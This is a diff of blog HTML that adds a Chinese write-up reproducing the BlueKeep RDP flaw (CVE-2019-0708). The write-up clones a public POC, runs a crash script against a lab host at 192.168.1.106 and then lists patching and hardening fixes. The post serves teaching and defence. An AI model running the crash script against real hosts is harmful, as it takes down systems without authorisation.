@@ -96,13 +96,22 @@
 
 
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Teams Six">
-<meta property="og:url" content="http://www.teamssix.com/tags/Hexo/index.html">
+  <meta name="description" content="0x00 前言 2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。  以上内容来自360网络安全响">
+<meta name="keywords" content="漏洞复现,CVE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【漏洞复现】17年的勒索病毒又双叕卷土重来了？">
+<meta property="og:url" content="http://www.teamssix.com/year/190615-013724.html">
 <meta property="og:site_name" content="Teams Six">
+<meta property="og:description" content="0x00 前言 2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。  以上内容来自360网络安全响">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://pt2jsbugk.bkt.clouddn.com/2019-07081.gif">
+<meta property="og:image" content="http://pt2jsbugk.bkt.clouddn.com/2019-07082.png">
+<meta property="og:image" content="http://pt2jsbugk.bkt.clouddn.com/2019-07083.png">
+<meta property="og:updated_time" content="2019-06-14T17:54:17.982Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Teams Six">
+<meta name="twitter:title" content="【漏洞复现】17年的勒索病毒又双叕卷土重来了？">
+<meta name="twitter:description" content="0x00 前言 2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。  以上内容来自360网络安全响">
+<meta name="twitter:image" content="http://pt2jsbugk.bkt.clouddn.com/2019-07081.gif">
 
 
 
@@ -112,7 +121,7 @@
 
   
   
-  <link rel="canonical" href="http://www.teamssix.com/tags/Hexo/">
+  <link rel="canonical" href="http://www.teamssix.com/year/190615-013724">
 
 
 
@@ -122,7 +131,7 @@
   };
 </script>
 
-  <title>标签: Hexo | Teams Six</title>
+  <title>【漏洞复现】17年的勒索病毒又双叕卷土重来了？ | Teams Six</title>
   
 
 
@@ -180,7 +189,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 <!--
 <a href="https://github.com/teamssix"><img width="149" height="149" src="https://github.blog/wp-content/uploads/2008/12/forkme_right_gray_6d6d6d.png?resize=149%2C149" class="attachment-full size-full" alt="Fork me on GitHub" data-recalc-dims="1"></a>
@@ -276,22 +285,6 @@
   
     
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
   
 
   
@@ -316,57 +309,268 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block tag">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Hexo<small>标签</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://www.teamssix.com/year/190615-013724.html">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Teams Six">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/TEAMSSIX_396K.JPG">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Teams Six">
+    </span>
+
+    
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/year/191612-123700.html" itemprop="url">
-            
-              <span itemprop="name">为自定义域名的Hexo博客升级到Https网站</span>
-            
-          </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">【漏洞复现】17年的勒索病毒又双叕卷土重来了？
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-06-12T12:37:00+08:00" content="2019-06-12">
-          06-12
-        </time>
-      </div>
+              
+            
+          </h1>
+        
 
-    </header>
-  </article>
+        <div class="post-meta">
+          <span class="post-time">
 
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-06-15 01:37:24 / 修改时间：01:54:17" itemprop="dateCreated datePublished" datetime="2019-06-15T01:37:24+08:00">2019-06-15</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/漏洞复现/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/year/190615-013724.html#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/year/190615-013724.html" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><blockquote>
+<p>2019年5月14日微软官方发布安全补丁，修复了Windows远程桌面服务的远程代码执行漏洞，该漏洞影响了某些旧版本的Windows系统。此漏洞是预身份验证且无需用户交互，这就意味着这个漏洞可以通过网络蠕虫的方式被利用。利用此漏洞的任何恶意软件都可能从被感染的计算机传播到其他易受攻击的计算机，其方式与2017年WannaCry恶意软件的传播方式类似。</p>
+</blockquote>
+<p>以上内容来自360网络安全响应中心。<br>从微软官方的消息一出，各大安全厂商都开始发布了漏洞预警，那段时间我也一直在找对应的POC，但要不就是不能利用的POC，要不就是利用以前漏洞写的POC，更有甚着点击attack后给你惊喜。<br><img src="http://pt2jsbugk.bkt.clouddn.com/2019-07081.gif" alt="图片"><br>看到这个图片的时候，真的一副生无可恋的样子，随着时间推移，渐渐的也就不怎么关注这个漏洞了。<br>直到今天，看到网上有人发一些关于这个漏洞的利用复现视频的时候，才意识到已经过去正好一个月的，此时POC也早就被公布了。<br>早在在5月31日的时候，n1xbyte就在Github上发布了利用该漏洞导致系统蓝屏的可用POC ,所以我们来复现看看吧。</p>
+<a id="more"></a>
+<h1 id="0x01-下载POC"><a href="#0x01-下载POC" class="headerlink" title="0x01 下载POC"></a>0x01 下载POC</h1><p>首先git clone代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/n1xbyte/CVE-2019-0708.git</span><br><span class="line">cd CVE-2019-0708</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pt2jsbugk.bkt.clouddn.com/2019-07082.png" alt="图片"></p>
+<h1 id="0x02-开始复现"><a href="#0x02-开始复现" class="headerlink" title="0x02 开始复现"></a>0x02 开始复现</h1><p>1、为了顺利复现成功，需要将被攻击机的远程桌面设为允许，防火墙也需要关掉。<br>2、被攻击机的IP地址与操作系统信息如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#被攻击主机</span><br><span class="line">ip地址：192.168.1.106</span><br><span class="line">系统类型：64位</span><br></pre></td></tr></table></figure>
+
+<p>3、安装需要的库后执行POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install impacket</span><br><span class="line">python3 crashpoc.py 192.168.1.106 64  #python3 crashpoc ip地址 系统类型</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pt2jsbugk.bkt.clouddn.com/2019-07083.png" alt="图片"><br>POC被成功被执行，虽然现阶段只是让目标蓝屏，但是对这个漏洞的利用手段绝对不会止步于此。</p>
+<h1 id="0x03-修复方案"><a href="#0x03-修复方案" class="headerlink" title="0x03 修复方案"></a>0x03 修复方案</h1><p>1、最简便的方法就是安装一个安全管家，比如火绒、360之类的<br>2、把系统的自动更新打开或者到微软官网<a href="https://portal.msrc.microsoft.com/zh-cn/security-guidance/advisory/CVE-2019-0708" target="_blank" rel="noopener">下载补丁</a><br>3、把自己电脑上的远程桌面关掉、防火墙开启</p>
+<h1 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04 小结"></a>0x04 小结</h1><p>总是有人说没有绝对的安全，当然事实也确实是如此，但是只要我们平时养成一个良好的安全习惯，还是可以避免很多病毒木马的侵害的，毕竟很多的恶意程序都是广撒网，捕的鱼多不多就是另一回事儿了。</p>
+<p><strong>最后再次强调，不得将本视频用作违法犯罪目的，本视频只用作技术分享交流学习使用。</strong></p>
 
       
     </div>
 
+    <!-- 版权声明 -->
+<div>
+ 
+    <ul class="post-copyright">
+      <li class="post-copyright-author">
+          <strong>本文作者：</strong>Teams Six
+      </li>
+      <li class="post-copyright-link">
+        <strong>本文链接：</strong>
+        <a href="https://teamssix.com//year/190615-013724.html" title="【漏洞复现】17年的勒索病毒又双叕卷土重来了？">https://teamssix/year/190615-013724.html</a>
+      </li>
+      <li class="post-copyright-license">
+        <strong>版权声明：</strong>
+        本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！
+      </li>
+    </ul>
+  
+</div>
+
+
+    
+
+    
+    
+    
+
+    
+      <div id="wechat_subscriber" style="display: block; padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+  <img id="wechat_subscriber_qcode" src="/images/wechat-qcode.jpg" alt="Teams Six wechat" style="width: 200px; max-width: 100%;">
+  <div>欢迎微信扫描上方二维码关注本站对应公众号</div>
+</div>
+
+    
+
+    
+      
+    
+    
+
+    
+    
+	<div>
+  		
+    	<div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------　<i class="fa fa-heart"></i>　感谢您的阅读　<i class="fa fa-heart"></i>　------</div>
+    
+</div>
+  		
+	</div>
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/漏洞复现/" rel="tag"># 漏洞复现</a>
+          
+            <a href="/tags/CVE/" rel="tag"># CVE</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/year/190614-134948.html" rel="next" title="对于连接ssh时连时断的解决方法">
+                <i class="fa fa-chevron-left"></i> 对于连接ssh时连时断的解决方法
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
 
         </div>
         
@@ -386,8 +590,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -564,6 +777,23 @@
       </div>
 
       
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-前言"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-下载POC"><span class="nav-number">2.</span> <span class="nav-text">0x01 下载POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-开始复现"><span class="nav-number">3.</span> <span class="nav-text">0x02 开始复现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-修复方案"><span class="nav-number">4.</span> <span class="nav-text">0x03 修复方案</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04-小结"><span class="nav-number">5.</span> <span class="nav-text">0x04 小结</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
       
 
@@ -703,6 +933,10 @@
 
 
   
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
 
   
 
@@ -748,6 +982,8 @@
 
 
 
+
+  
 
 
   
